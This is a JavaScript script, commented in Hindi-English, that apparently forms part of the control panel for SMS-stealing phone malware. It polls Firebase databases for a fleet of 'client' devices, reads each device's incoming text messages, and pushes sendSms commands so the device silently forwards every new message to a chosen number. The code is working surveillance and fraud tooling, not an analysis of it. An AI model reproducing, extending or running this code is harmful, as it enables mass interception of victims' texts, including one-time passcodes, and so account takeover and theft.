/* ============================================================
   ANANYA SMS Forwarder v4.0
   - Sirf enabledAt ke BAAD ke messages forward karega
   - Purane messages skip karega
   - Continuous chalta rahega, toggle nahi chahiye
   ============================================================ */

(function () {
    'use strict';

    console.log('[SMS-FWD] v4.0 Loaded ✅');

    var ACCOUNTS_KEY = 'flixy_accounts';
    var PROCESSED_KEY = 'sms_fwd_v4';
    var POLL_INTERVAL = 2000;  // 2 sec

    function getAccounts() {
        try {
            var s = localStorage.getItem(ACCOUNTS_KEY);
            return s ? JSON.parse(s) : [];
        } catch (e) { return []; }
    }

    async function fbGet(base, key, path) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url);
            if (!r.ok) return null;
            return await r.json();
        } catch (e) { return null; }
    }

    async function fbPut(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) { return false; }
    }

    async function fbPush(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) { return false; }
    }

    // ============ PROCESSED TRACKER ============
    var processed = new Set();
    try {
        var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
        for (var i = 0; i < saved.length; i++) processed.add(saved[i]);
    } catch (e) {}

    function markDone(k) {
        processed.add(k);
        try {
            var arr = Array.from(processed).slice(-1000);
            localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
        } catch (e) {}
    }

    // ============ TIMESTAMP EXTRACTOR ============
    function getMsgTimestamp(sms) {
        if (!sms) return 0;
        // Try different timestamp fields
        if (sms.timestamp && typeof sms.timestamp === 'number') return sms.timestamp;
        if (sms.dateTime) {
            var t = new Date(sms.dateTime).getTime();
            if (!isNaN(t)) return t;
        }
        if (sms.time) {
            var t2 = new Date(sms.time).getTime();
            if (!isNaN(t2)) return t2;
        }
        return 0;  // unknown → treat as old
    }

    // ============ CORE — PROCESS ONLY NEW MESSAGES ============
    async function handleDevice(acc, devId) {
        try {
            // 1. Get forwarding config
            var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
            if (!cfg) return;
            if (!cfg.enabled) return;
            if (!cfg.forwardTo) return;

            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
            var simSlot = cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0);
            var enabledAt = cfg.enabledAt || 0;  // ← ye naya field hai

            if (!to) return;

            // 2. Get messages
            var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
            if (!msgs || typeof msgs !== 'object') return;

            var ids = Object.keys(msgs);
            if (!ids.length) return;

            ids.sort(function (a, b) { return Number(a) - Number(b); });

            // 3. Sirf LAST 5 messages check karo (safety)
            //    But filter by enabledAt
            var scanLimit = Math.min(5, ids.length);
            var startIdx = ids.length - scanLimit;

            for (var i = startIdx; i < ids.length; i++) {
                var msgId = ids[i];
                var k = devId + '_' + msgId;

                if (processed.has(k)) continue;

                var sms = msgs[msgId];
                if (!sms) { markDone(k); continue; }
                if (sms.type !== 'incoming') { markDone(k); continue; }

                // 4. ✅ MAIN FILTER — sirf naye messages forward karo
                var msgTime = getMsgTimestamp(sms);

                // Agar message ka time enabledAt se pehle ka hai → skip
                if (enabledAt > 0 && msgTime > 0 && msgTime < enabledAt) {
                    markDone(k);
                    console.log('[SMS-FWD] ⏭ Skipped old msg:', msgId);
                    continue;
                }

                var text = sms.message || sms.body || sms.text || '';
                if (!text) { markDone(k); continue; }

                // ======== FORWARD ========
                var ts = Date.now();
                var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
                var sim = { simSlot: simSlot };

                console.log('[SMS-FWD] 📤 Forwarding:', sms.sender || 'Unknown', '→', to);

                // PATH 1: webhookEvent/sendSms
                await fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
                    to: to, message: text, isSended: false,
                    timestamp: ts, commandId: cid, simInfo: sim,
                    forwarded: true, originalSender: sms.sender || 'Unknown'
                });

                // PATH 2: commands/sendSms
                await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
                    targetNumber: to, message: text, timestamp: ts,
                    status: 'pending', id: cid, simInfo: sim, forwarded: true
                });

                // PATH 3: messages (log)
                await fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
                    sender: 'FORWARDER',
                    message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
                    dateTime: ts, timestamp: ts, type: 'outgoing',
                    targetNumber: to, commandId: cid, status: 'pending',
                    simInfo: sim, forwarded: true
                });

                // PATH 4: sms
                await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
                    to: to, text: text, timestamp: ts, status: 'pending',
                    commandId: cid, forwarded: true
                });

                markDone(k);
                console.log('[SMS-FWD] ✅ Forwarded:', sms.sender || 'Unknown', '→', to);
            }

        } catch (e) {
            console.error('[SMS-FWD] Error:', e.message);
        }
    }

    // ============ MAIN LOOP ============
    var busy = false;

    async function tick() {
        if (busy) return;
        busy = true;
        try {
            var accs = getAccounts();
            for (var i = 0; i < accs.length; i++) {
                var acc = accs[i];
                if (!acc.url || !acc.key) continue;

                var clients = await fbGet(acc.url, acc.key, 'clients');
                if (!clients || typeof clients !== 'object') continue;

                var devIds = Object.keys(clients);
                for (var j = 0; j < devIds.length; j++) {
                    await handleDevice(acc, devIds[j]);
                }
            }
        } finally {
            busy = false;
        }
    }

    setInterval(tick, POLL_INTERVAL);
    setTimeout(tick, 2000);

    console.log('[SMS-FWD] v4.0 Running 🚀 — sirf naye messages forward honge');

})();
